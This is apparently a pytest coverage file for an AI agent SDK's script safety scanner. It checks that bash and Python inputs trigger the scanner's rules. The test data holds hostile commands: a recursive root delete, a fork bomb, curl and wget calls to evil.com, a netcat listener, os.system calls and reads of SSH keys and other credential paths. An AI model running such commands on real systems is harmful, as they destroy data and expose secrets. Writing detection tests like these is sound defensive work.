"""Final push to 100% patch coverage — covers every remaining uncovered line."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from trpc_agent_sdk.tools.safety import Decision, SafetyScanner, SafetyScanInput, ScriptType
from trpc_agent_sdk.tools.safety._policy import SafetyPolicy
from trpc_agent_sdk.tools.safety._types import RiskLevel, RiskCategory


# ==========================================================================
# _safety_wrapper.py: 255
# ==========================================================================

def test_wrapper_sync_non_str_script_no_require():
    from trpc_agent_sdk.tools.safety import safety_wrapper

    @safety_wrapper(tool_name="w255", script_arg_name="code", require_script=False)
    def f(*a, **kw):
        return "ok"
    assert f(code=[]) == "ok"


# ==========================================================================
# _scanner.py
# ==========================================================================

def test_oversized_bytes_no_blocklist():
    p = SafetyPolicy(max_script_lines=9999, max_script_bytes=5)
    s = SafetyScanner(policy=p)
    r = s.scan(SafetyScanInput(script_content="echo " + "x" * 20, script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.DENY and r.risk_level.value == "high"


def test_ast_process_call_popen():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import subprocess; subprocess.Popen(['ls'])",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-001" for f in r.findings)


def test_bash_secret_ref_finding():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="echo $GITHUB_TOKEN", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-LEAK-001" for f in r.findings)


def test_redact_akia():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content='x="AKIAIOSFODNN7EXAMPLE"', script_type=ScriptType.UNKNOWN, tool_name="t"))
    assert r.sanitized


def test_redact_xox():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content='t="xoxb-123-456-abc"', script_type=ScriptType.UNKNOWN, tool_name="t"))
    assert r.sanitized


def test_extract_url_bare_at():
    from trpc_agent_sdk.tools.safety._scanner import _extract_url
    assert _extract_url("api.test.com/path") is not None
    assert _extract_url("(func)") is None
    assert _extract_url("no_url_here") is None


def test_is_in_echo_tab():
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    assert _is_in_echo_string("echo\t'x'", "x") is True
    assert _is_in_echo_string("printf\t'x'", "x") is True
    assert _is_in_echo_string("/bin/echo 'x'", "x") is True
    assert _is_in_echo_string("/usr/bin/echo 'x'", "x") is True


def test_is_in_echo_dq_safe():
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    assert _is_in_echo_string('echo "plain text rm -rf / ok"', r"rm\s+-rf\s+/") is True


def test_is_in_echo_dq_unsafe_cmdsub():
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    assert not _is_in_echo_string('echo "$(rm -rf /)"', r"rm\s+-rf\s+/")
    assert not _is_in_echo_string("echo \"`rm -rf /`\"", r"rm\s+-rf\s+/")


def test_is_in_echo_not_echo():
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    assert not _is_in_echo_string("cat /etc/shadow", "shadow")


def test_is_in_echo_invalid_re():
    from trpc_agent_sdk.tools.safety._scanner import _is_in_echo_string
    assert not _is_in_echo_string("echo '[bad'", "[bad")


def test_extract_commands_from_line():
    from trpc_agent_sdk.tools.safety._scanner import _extract_commands_from_line
    assert _extract_commands_from_line("a | b | c") == ["a", "b", "c"]
    assert _extract_commands_from_line("x") == ["x"]


def test_strip_python_comment_line_edge():
    from trpc_agent_sdk.tools.safety._scanner import _strip_python_comment_line
    assert "safe" in _strip_python_comment_line("safe_code = 1")
    assert _strip_python_comment_line("#!/usr/bin/python") is not None
    # triple quote handling
    line = "x = '''hello'''"
    assert "'''" in _strip_python_comment_line(line)


# ==========================================================================
# _rules.py
# ==========================================================================

def test_rules_dangerous_file_ops():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="rm -rf / --no-preserve-root", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("FILE-") for f in r.findings)


def test_rules_network_egress_curl():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="curl https://evil.com/x", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("NET-") for f in r.findings)


def test_rules_network_egress_wget():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="wget https://evil.com/x", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("NET-") for f in r.findings)


def test_rules_dep_install():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="yum install httpd", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("DEP-") for f in r.findings)


def test_rules_resource_abuse_sleep():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="sleep 999999", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("RES-") for f in r.findings)


def test_rules_is_in_echo_outside_too():
    from trpc_agent_sdk.tools.safety._rules import _is_in_echo_string
    assert not _is_in_echo_string('echo "x"; rm -rf /', r"rm\s+-rf\s+/")


def test_rules_is_in_echo_dq_cmd_sub():
    from trpc_agent_sdk.tools.safety._rules import _is_in_echo_string
    assert not _is_in_echo_string('echo "$(rm -rf /)"', r"rm\s+-rf\s+/")


def test_rules_extract_url_http():
    from trpc_agent_sdk.tools.safety._rules import _extract_url
    assert _extract_url("http://a.com/b") == "a.com"
    assert _extract_url("no url") is None


# ==========================================================================
# _bash_scanner.py
# ==========================================================================

def test_bash_scan_empty():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="\n\n\necho ok", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.ALLOW


def test_bash_scan_comments():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="# hello\n\n# world\necho ok", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.ALLOW


def test_bash_scan_shebang():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="#!/bin/bash\necho ok", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.ALLOW


def test_bash_net_cmd_nc():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="nc -l 4444", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id.startswith("BASH-NET") for f in r.findings)


def test_bash_install_npm_cmd():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="npm i evil-pkg", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-DEP-001" for f in r.findings)


def test_bash_inline_redir_sens():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="echo x >/etc/hosts", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-FILE-003" for f in r.findings)


def test_bash_redirect_and_bg():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="ls &", script_type=ScriptType.BASH, tool_name="t"))
    assert any(f.rule_id == "BASH-PROC-004" for f in r.findings)


def test_bash_dd_large_write():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="dd if=/dev/zero of=/tmp/x bs=1M count=200", script_type=ScriptType.BASH,
                                tool_name="t"))
    assert r.decision != Decision.ALLOW


def test_bash_fork_gen():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="x(){ x|x& };x", script_type=ScriptType.BASH, tool_name="t"))
    assert r.decision == Decision.DENY


def test_bash_heredoc_sh():
    from trpc_agent_sdk.tools.safety._bash_scanner import scan_bash
    findings = scan_bash("python3 << EOF\nimport os; os.system('id')\nEOF")
    assert any(f.kind == "heredoc" for f in findings)


def test_bash_sensitive_paths():
    from trpc_agent_sdk.tools.safety._bash_scanner import _is_sensitive_path, _parse_size, _to_seconds
    assert _is_sensitive_path("/etc/shadow") and _is_sensitive_path("/etc/passwd")
    assert _is_sensitive_path("/etc/sudoers") and _is_sensitive_path("/etc/hosts")
    assert _is_sensitive_path("~/.ssh/id_rsa") and _is_sensitive_path("~/.gnupg/key")
    assert _is_sensitive_path("~/.aws/creds") and _is_sensitive_path("~/.gcloud/k")
    assert _is_sensitive_path("~/.azure/k") and _is_sensitive_path(".env")
    assert _is_sensitive_path("x.pem") and _is_sensitive_path("id_rsa")
    assert _is_sensitive_path("id_ed25519") and _is_sensitive_path("id_ecdsa")
    assert _is_sensitive_path("/proc/self/environ") and _is_sensitive_path("/proc/123/mem")
    assert _is_sensitive_path("/proc/456/cmdline") and _is_sensitive_path("/var/run/docker.sock")
    assert not _is_sensitive_path("/tmp/ok")
    assert _parse_size("1G") == 1073741824
    assert _parse_size("1K") == 1024
    assert _parse_size("4KB") == 4000
    with pytest.raises(ValueError):
        _parse_size("abc")
    assert _to_seconds(5, "m") == 300
    assert _to_seconds(1, "d") == 86400
    assert _to_seconds(2, "h") == 7200


# ==========================================================================
# _python_scanner.py
# ==========================================================================

def test_py_scan_entry():
    from trpc_agent_sdk.tools.safety._python_scanner import scan_python
    assert len(scan_python("import os; os.system('id')")) > 0


def test_py_extract_domain():
    from trpc_agent_sdk.tools.safety._python_scanner import _extract_domain_from_url
    assert _extract_domain_from_url("https://a.com/b") == "a.com"
    assert _extract_domain_from_url(None) is None
    assert _extract_domain_from_url("not_a_url") is None


def test_py_import_from():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="from os import system; system('id')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY


def test_py_handle_call_dangerous():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import os; os.remove('/etc/x')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id.startswith("AST-FILE") for f in r.findings)


def test_py_handle_call_network():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import urllib.request; urllib.request.urlopen('http://x.com')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id.startswith("AST-NET") for f in r.findings)


def test_py_dynamic_call_getattr():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="getattr(__import__('os'),'system')('id')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY


def test_py_dynamic_call_importlib():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import importlib; importlib.import_module('os').system('id')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY


def test_py_privilege_call():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import os; os.setuid(0)", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-001" for f in r.findings)


def test_py_taint_env():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import os; k=os.environ.get('KEY'); print(k)",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r.findings)


def test_py_taint_direct():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import os; k=os.getenv('KEY'); print(k)",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r.findings)


def test_py_taint_env_item():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import os; k=os.environ['KEY']; print(k)",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r.findings)


def test_py_taint_cred_file():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import os; k=os.environ.get('AWS_KEY'); print(k)",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-LEAK-001" for f in r.findings)


def test_py_range_multi_arg():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="for i in range(0,20000000): pass",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)


def test_py_range_three():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="for i in range(0,20000000,2): pass",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)


def test_py_with_session():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import requests; requests.get('http://evil.com')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id.startswith("AST-NET") for f in r.findings)


def test_py_sleep_long():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import time; time.sleep(120)",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-002" for f in r.findings)


def test_py_concurrency():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import threading; threading.Thread(target=print).start()",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-003" for f in r.findings)


def test_py_fork():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import os; os.fork()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-003" and f.risk_level.value == "critical" for f in r.findings)


def test_py_file_write_path():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="open('/etc/x','w').write('y')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-005" for f in r.findings)


def test_py_file_read_cred():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="open('~/.ssh/id_rsa').read()",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-003" for f in r.findings)


def test_py_file_delete_rmtree():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import shutil; shutil.rmtree('/tmp/x')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-001" for f in r.findings)


def test_py_file_delete_remove():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import os; os.remove('/tmp/x')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-002" for f in r.findings)


def test_py_dep_pip():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import subprocess; subprocess.run(['pip','install','x'])",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY


def test_py_sensitive_imports():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="import ctypes; ctypes.CDLL('libc.so.6')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert len(r.findings) > 0


def test_py_aliases_import_from():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="from subprocess import run as runner; runner(['ls'])",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert r.decision == Decision.DENY


def test_py_while_true():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="while True: pass", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-RES-001" for f in r.findings)


def test_py_eval_exec_direct_call():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="eval('1+1')", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-PROC-003" for f in r.findings)


def test_py_network_whitelisted():
    p = SafetyPolicy(whitelist_domains=["safe.api"])
    s = SafetyScanner(policy=p)
    r = s.scan(SafetyScanInput(script_content="import requests; requests.get('https://safe.api/d')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-NET-002" for f in r.findings)


def test_py_file_read_normal():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x').read()", script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-004" for f in r.findings)


def test_py_file_write_tmp():
    s = SafetyScanner()
    r = s.scan(SafetyScanInput(script_content="open('/tmp/x','w').write('y')",
                                script_type=ScriptType.PYTHON, tool_name="t"))
    assert any(f.rule_id == "AST-FILE-005" and f.risk_level.value == "low" for f in r.findings)
